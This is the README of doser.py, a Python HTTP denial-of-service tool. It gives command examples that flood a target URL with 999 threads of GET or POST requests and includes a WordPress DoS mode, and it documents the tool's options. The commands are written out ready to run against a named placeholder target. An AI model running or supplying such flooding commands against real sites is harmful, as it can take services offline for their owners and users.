
# doser.py
DoS tool for HTTP requests (inspired by hulk but has more functionalities) written in Python:
![](https://raw.githubusercontent.com/Quitten/doser.py/master/doser.jpg)

# Examples
999 threads sends GET requests:

```bash
python doser.py -t 999 -g 'https://targeted.site.com'
```
Perform Wordpress Dos:

```bash
python doser.py -t 999 -g 'https://targeted.site.com' -wpd true
```

999 threads sends POST requests with json data:

```bash
python doser.py -t 999 -p 'https://targeted.site.com' -ah 'Content-Type: application/json' -d '{"json": "payload"}'
```

# Usage
usage: doser.py [-h] [-g G] [-p P] [-d D] [-ah AH] [-t T] [-wpd WPD]

optional arguments:

  -h, --help  show this help message and exit
  
  -g        Specify GET request. Usage: -g '< url >'
  
  -p        Specify POST request. Usage: -p '< url >'
  
  -d        Specify data payload for POST request
  
  -ah      Specify addtional header
  
  -wpd      Specify True and this param to test wordpress dos
  
  -t        Specify number of threads to be used
